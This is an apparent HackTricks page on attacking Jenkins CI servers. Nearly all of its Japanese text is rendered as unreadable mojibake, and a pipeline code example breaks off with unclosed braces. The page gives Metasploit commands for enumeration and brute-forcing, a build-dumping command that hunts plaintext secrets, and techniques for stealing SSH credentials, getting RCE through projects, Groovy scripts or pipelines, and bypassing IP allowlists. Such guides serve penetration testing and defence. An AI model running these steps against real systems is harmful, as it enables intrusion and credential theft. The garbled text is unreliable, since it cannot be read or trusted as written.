# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã‚ˆã†ã€‚
* **PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã‚ˆã†** [**HackTricks**](https://github.com/carlospolop/hacktricks)ã‚„[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«ã€‚

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

Jenkinsã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ä½¿ç”¨ã—ã¦**ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èª**ã‚„ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒªãƒã‚¸ãƒˆãƒªã®**ã»ã¼ã™ã¹ã¦**ã®çµ„ã¿åˆã‚ã›ã«å¯¾ã—ã¦**ç¶™ç¶šçš„ã‚¤ãƒ³ãƒ†ã‚°ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã¾ãŸã¯**ç¶™ç¶šçš„ãƒ‡ãƒªãƒãƒªãƒ¼**ï¼ˆCI/CDï¼‰ç’°å¢ƒã‚’ç¢ºç«‹ã™ã‚‹ãŸã‚ã®ç°¡å˜ãªæ–¹æ³•ã‚’æä¾›ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ã•ã‚‰ã«ã€ã•ã¾ã–ã¾ãªæ—¥å¸¸çš„ãªé–‹ç™ºã‚¿ã‚¹ã‚¯ã‚’è‡ªå‹•åŒ–ã—ã¾ã™ã€‚Jenkinsã¯**å€‹ã€…ã®ã‚¹ãƒ†ãƒƒãƒ—ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã™ã‚‹å¿…è¦æ€§ã‚’æ’é™¤ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“**ãŒã€æ‰‹å‹•ã§ç°¡å˜ã«æ§‹ç¯‰ã§ãã‚‹ã‚ˆã‚Šã‚‚è¿…é€Ÿã‹ã¤å …ç‰¢ã«ãƒ“ãƒ«ãƒ‰ã€ãƒ†ã‚¹ãƒˆã€ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãƒ„ãƒ¼ãƒ«ã®å…¨ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’çµ±åˆã™ã‚‹æ–¹æ³•ã‚’æä¾›ã—ã¾ã™ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## èªè¨¼ãªã—ã®åˆ—æŒ™

èªè¨¼ãªã—ã§èˆˆå‘³æ·±ã„Jenkinsãƒšãƒ¼ã‚¸ï¼ˆä¾‹ï¼š_/people_ ã‚„ _/asynchPeople_ã€ã“ã‚Œã‚‰ã¯ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ï¼‰ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã‚’ä½¿ç”¨ã§ãã¾ã™:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
èªè¨¼ãªã—ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‹ç¢ºèªã—ã¾ã™:
```
msf> use auxiliary/scanner/http/jenkins_command
```
è³‡æ ¼æƒ…å ±ãŒãªãã¦ã‚‚ã€_**/asynchPeople/**_ ãƒ‘ã‚¹ã‚„ _**/securityRealm/user/admin/search/index?q=**_ ã§ **ãƒ¦ãƒ¼ã‚¶ãƒ¼å** ã‚’ç¢ºèªã§ãã¾ã™ã€‚

ãƒ‘ã‚¹ _**/oops**_ ã¾ãŸã¯ _**/error**_ ã‹ã‚‰ Jenkins ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

![](<../../.gitbook/assets/image (146).png>)

### æ—¢çŸ¥ã®è„†å¼±æ€§

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ãƒ­ã‚°ã‚¤ãƒ³

åŸºæœ¬æƒ…å ±ã§ã¯ã€Jenkins ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹**ã™ã¹ã¦ã®æ–¹æ³•ã‚’ç¢ºèª**ã§ãã¾ã™ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ç™»éŒ²

ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ Jenkins ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ãã‚Œã ã‘ç°¡å˜ã§ã™ã€‚**

### **SSO ãƒ­ã‚°ã‚¤ãƒ³**

**SSO** **æ©Ÿèƒ½**/**ãƒ—ãƒ©ã‚°ã‚¤ãƒ³**ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€ãƒ†ã‚¹ãƒˆã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆä¾‹ï¼šãƒ†ã‚¹ãƒˆ **Github/Bitbucket ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**ãƒ­ã‚°ã‚¤ãƒ³**ã‚’è©¦ã¿ã‚‹ã¹ãã§ã™ã€‚[**ã“ã¡ã‚‰**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ã®ãƒˆãƒªãƒƒã‚¯ã€‚

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

**Jenkins** ã«ã¯ **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼** ã¨ **ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒãƒ¼ãƒ ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ç·©å’Œ**ãŒæ¬ ã‘ã¦ã„ã¾ã™ã€‚**å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚„ **ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒãƒ¼ãƒ ã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨**ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ãŒé‡è¦ã§ã™ã€‚ã•ã‚‰ã«ã¯ã€**é€†ã«ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒãƒ¼ãƒ ã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨**ã—ã¦ã„ã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚¹ãƒ—ãƒ¬ãƒ¼

[ã“ã®Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ã¾ãŸã¯ [ã“ã®PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/chryzsh/JenkinsPasswordSpray) ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

### IPãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆãƒã‚¤ãƒ‘ã‚¹

å¤šãã®çµ„ç¹”ã¯ã€GitHubã‚„GitLabãªã©ã®**SaaSãƒ™ãƒ¼ã‚¹ã®ã‚½ãƒ¼ã‚¹ç®¡ç†ï¼ˆSCMï¼‰ã‚·ã‚¹ãƒ†ãƒ **ã¨ã€Jenkinsã‚„TeamCityã®ã‚ˆã†ãª**å†…éƒ¨ã®ã‚»ãƒ«ãƒ•ãƒ›ã‚¹ãƒˆCI**ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’çµ„ã¿åˆã‚ã›ã¦ã„ã¾ã™ã€‚ã“ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã«ã‚ˆã‚Šã€CIã‚·ã‚¹ãƒ†ãƒ ã¯**SaaSã‚½ãƒ¼ã‚¹ç®¡ç†ãƒ™ãƒ³ãƒ€ãƒ¼ã‹ã‚‰ã®Webhookã‚¤ãƒ™ãƒ³ãƒˆã‚’å—ä¿¡**ã—ã€ä¸»ã«ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚¸ãƒ§ãƒ–ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã«ã€çµ„ç¹”ã¯**SCMãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®IPãƒ¬ãƒ³ã‚¸**ã‚’**ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆ**ã«ç™»éŒ²ã—ã€**Webhook**ã‚’ä»‹ã—ã¦**å†…éƒ¨CIã‚·ã‚¹ãƒ†ãƒ **ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã—ã‹ã—ã€**èª°ã§ã‚‚**GitHubã‚„GitLabã«**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆ**ã—ã€**Webhookã‚’ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã‚ˆã†ã«è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã€**å†…éƒ¨CIã‚·ã‚¹ãƒ†ãƒ **ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ãƒã‚§ãƒƒã‚¯: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## å†…éƒ¨Jenkinsã®æ‚ªç”¨

ã“ã‚Œã‚‰ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã¨ä»®å®šã—ã¾ã™ã€‚

{% hint style="warning" %}
Jenkinsã§è¨­å®šã•ã‚Œã¦ã„ã‚‹**èªè¨¼**ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨ã€ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã«å¿œã˜ã¦ã€ä»¥ä¸‹ã®æ”»æ’ƒã‚’**å®Ÿè¡Œã§ãã‚‹ã‹ã©ã†ã‹**ãŒæ±ºã¾ã‚Šã¾ã™ã€‚
{% endhint %}

è©³ç´°ã«ã¤ã„ã¦ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªã‚¹ãƒˆè¡¨ç¤º

Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) ã§ä»–ã®ç™»éŒ²ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒªã‚¹ãƒˆè¡¨ç¤ºã§ãã¾ã™ã€‚

### ãƒ“ãƒ«ãƒ‰ã‚’ãƒ€ãƒ³ãƒ—ã—ã¦å¹³æ–‡ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹

[ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ“ãƒ«ãƒ‰ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã®å‡ºåŠ›ã‚„ãƒ“ãƒ«ãƒ‰ç’°å¢ƒå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã—ã€å¹³æ–‡ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚’è©¦ã¿ã¾ã™ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSHè³‡æ ¼æƒ…å ±ã®ç›—é›£**

ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**æ–°ã—ã„Jenkinsãƒãƒ¼ãƒ‰ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã®ã«ååˆ†ãªæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹**å ´åˆã€ä»–ã®ãƒãƒ¼ãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®SSHè³‡æ ¼æƒ…å ±ãŒæ—¢ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã¨ã€ãƒãƒ¼ãƒ‰ã‚’ä½œæˆ/å¤‰æ›´ã—ã€**ãƒ›ã‚¹ãƒˆã‚­ãƒ¼ã‚’æ¤œè¨¼ã›ãšã«è³‡æ ¼æƒ…å ±ã‚’è¨˜éŒ²ã™ã‚‹ãƒ›ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ã“ã¨ã§**ã€**ãã®è³‡æ ¼æƒ…å ±ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../.gitbook/assets/image (218).png>)

é€šå¸¸ã€Jenkinsã®sshè³‡æ ¼æƒ…å ±ã¯**ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**ï¼ˆ`/credentials/`ï¼‰ã«ã‚ã‚Šã¾ã™ã®ã§ã€ä»–ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã®ã¨åŒæ§˜ã«ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è©³ç´°ã¯[**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒ€ãƒ³ãƒ—ã‚»ã‚¯ã‚·ãƒ§ãƒ³**](./#dumping-secrets)ã‚’ã”è¦§ãã ã•ã„ã€‚

### **Jenkinsã§ã®RCE**

**Jenkinsã‚µãƒ¼ãƒãƒ¼ã§ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹**ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã™ã¹ã¦ã®**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆ**ã‚„**ç’°å¢ƒå¤‰æ•°**ã‚’æ¼æ´©ã•ã›ã€åŒã˜ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ä»–ã®ãƒã‚·ãƒ³ã‚’**æ”»æ’ƒ**ã—ãŸã‚Šã€**ã‚¯ãƒ©ã‚¦ãƒ‰è³‡æ ¼æƒ…å ±ã‚’åé›†**ã—ãŸã‚Šã™ã‚‹æ©Ÿä¼šã‚’å¾—ã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Jenkinsã¯**SYSTEMã¨ã—ã¦å®Ÿè¡Œ**ã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚’ä¾µå®³ã™ã‚‹ã¨æ”»æ’ƒè€…ã«**SYSTEMæ¨©é™**ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚

### **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã‚‹RCE**

ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆ/å¤‰æ›´ã¯ã€Jenkinsã‚µãƒ¼ãƒãƒ¼ä¸Šã§RCEã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã®ä¸€ã¤ã§ã™ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã«ã‚ˆã‚‹RCE**

æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã‚ˆã‚Šã‚‚ã‚¹ãƒ†ãƒ«ã‚¹æ€§ãŒé«˜ã„ã‹ã‚‚ã—ã‚Œãªã„Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã‚‹RCE

**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦RCEã‚’å–å¾—**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ã«ã¯ã€Jenkinsã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚

### ãƒ“ãƒ«ãƒ‰ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³

**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³**ã¯**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ“ãƒ«ãƒ‰ãƒ¡ã‚«ãƒ‹ã‚ºãƒ **ã¨ã—ã¦ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚ãã®å ´åˆã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®æ§‹æ–‡ã‚’å«ã‚€**ãƒªãƒã‚¸ãƒˆãƒªå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’è¨­å®šã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`/Jenkinsfile`ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š

![](<../../.gitbook/assets/image (127).png>)

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ä»–ã®å ´æ‰€**ï¼ˆä¾‹ãˆã°ä»–ã®ãƒªãƒã‚¸ãƒˆãƒªï¼‰ã«**ä¿å­˜**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã€ãƒªãƒã‚¸ãƒˆãƒªã®**ã‚¢ã‚¯ã‚»ã‚¹**ã¨ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’**åˆ†é›¢**ã™ã‚‹ã“ã¨ãŒç›®çš„ã§ã™ã€‚

æ”»æ’ƒè€…ãŒãã®ãƒ•ã‚¡ã‚¤ãƒ«ã«**æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**ãã‚Œã‚’å¤‰æ›´**ã—ã€Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã›ãšã«**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
æ”»æ’ƒè€…ã¯**ãƒ–ãƒ©ãƒ³ãƒä¿è­·ã‚’å›é¿**ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ã«ã‚ˆã£ã¦ã¯å›é¿ã§ãã‚‹ã‹ã©ã†ã‹ãŒç•°ãªã‚Šã¾ã™ï¼‰ã€‚

ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹æœ€ã‚‚ä¸€èˆ¬çš„ãªãƒˆãƒªã‚¬ãƒ¼ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒï¼ˆã¾ãŸã¯ä»–ã®ãƒ–ãƒ©ãƒ³ãƒï¼‰ã¸ã®**ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**
* ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒï¼ˆã¾ãŸã¯ä»–ã®ãƒ–ãƒ©ãƒ³ãƒï¼‰ã¸ã®**ãƒ—ãƒƒã‚·ãƒ¥**
* ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã‚’**æ›´æ–°**ã—ã€ä½•ã‚‰ã‹ã®æ–¹æ³•ã§å®Ÿè¡Œã•ã‚Œã‚‹ã®ã‚’å¾…ã¤

{% hint style="info" %}
**å¤–éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã§ã‚ã‚Œã°ã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼/çµ„ç¹”ã®ãƒªãƒã‚¸ãƒˆãƒªã®**ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã«PRã‚’ä½œæˆ**ã—ã¦**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã“ã¨ã¯æœŸå¾…ã§ãã¾ã›ã‚“ãŒã€**æ‚ªã„è¨­å®š**ãŒã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§**ä¼æ¥­ã‚’å®Œå…¨ã«ä¾µå®³**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³RCE

å‰è¿°ã®RCEã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€[**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å¤‰æ›´ã—ã¦RCEã‚’å–å¾—ã™ã‚‹**](./#rce-creating-modifying-pipeline)æŠ€è¡“ãŒæ—¢ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚

### ç’°å¢ƒå¤‰æ•°ã®ç¢ºèª

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å…¨ä½“ã¾ãŸã¯ç‰¹å®šã®ã‚¹ãƒ†ãƒ¼ã‚¸ã«å¯¾ã—ã¦**å¹³æ–‡ã®ç’°å¢ƒå¤‰æ•°**ã‚’å®£è¨€ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã‚‰ã®ç’°å¢ƒå¤‰æ•°ã«ã¯**æ©Ÿå¯†æƒ…å ±ã‚’å«ã‚ã‚‹ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“**ãŒã€æ”»æ’ƒè€…ã¯å¸¸ã«**ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³**è¨­å®š/Jenkinsfileã‚’**ç¢ºèª**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Jenkinsã§ç§˜å¯†æƒ…å ±ãŒé€šå¸¸ã©ã®ã‚ˆã†ã«æ‰±ã‚ã‚Œã‚‹ã‹ã«ã¤ã„ã¦ã®æƒ…å ±ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

è³‡æ ¼æƒ…å ±ã¯**ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã«ã‚¹ã‚³ãƒ¼ãƒ—**ã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Œã°ï¼ˆ`/credentials/`ï¼‰ã€**ç‰¹å®šã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¹ã‚³ãƒ¼ãƒ—**ã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ï¼ˆ`/job/<project-name>/configure`ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€ã™ã¹ã¦ã®è³‡æ ¼æƒ…å ±ã‚’æµå‡ºã•ã›ã‚‹ãŸã‚ã«ã¯ã€ç§˜å¯†æƒ…å ±ã‚’å«ã‚€ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’**å°‘ãªãã¨ã‚‚ã™ã¹ã¦å¦¥å”**ã—ã€ã‚«ã‚¹ã‚¿ãƒ /æ¯’ã•ã‚ŒãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

